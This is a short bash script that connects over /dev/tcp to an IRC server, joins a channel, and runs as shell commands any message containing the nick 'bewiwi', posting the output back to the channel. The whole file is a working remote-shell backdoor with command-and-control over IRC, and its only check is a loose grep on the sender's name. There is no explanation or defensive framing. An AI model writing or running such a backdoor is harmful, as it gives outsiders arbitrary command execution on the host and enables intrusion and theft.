#!/bin/bash
 
##########################################################
# Config
 
NICK="BASHTEST"
SERVER="irc.freenode.net"
PORT=6667
CHANNEL="#prout2"
 
##########################################################
# Main
set -o igncr
 
exec 3<>/dev/tcp/${SERVER}/${PORT}
echo "NICK ${NICK}" >&3
echo "USER ${NICK} 8 * : ${NICK}" >&3
echo "JOIN ${CHANNEL}" >&3
while read line
do
    command=$(echo $line | grep ":bewiwi" | sed 's/^:[^:]*://g' )
    command=$(echo $command | sed "s/\r//g" )
    [  -z "$command" ] &&  continue
    for i in $(bash -c "$command")
    do
        echo "PRIVMSG $CHANNEL : $i" >&3
    done
done <&3 
exit $?
